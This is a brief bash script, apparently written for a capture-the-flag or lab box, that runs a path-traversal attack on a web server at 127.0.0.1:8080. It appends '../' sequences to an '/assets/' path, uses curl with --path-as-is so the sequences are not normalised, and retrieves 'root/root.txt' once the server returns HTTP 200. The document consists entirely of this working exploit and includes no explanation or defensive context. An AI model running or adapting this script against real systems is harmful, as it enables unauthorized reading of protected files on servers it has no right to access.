#!/bin/bash

url="http://127.0.0.1:8080"
string="../"
payload="/assets/"
file="root/root.txt"

for((i=0;i<15;i++)); do
payload+="$string"
code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")

if [[ $code -eq 200 ]]; then
curl -s --path-as-is "$url$payload$file"
break
fi
done
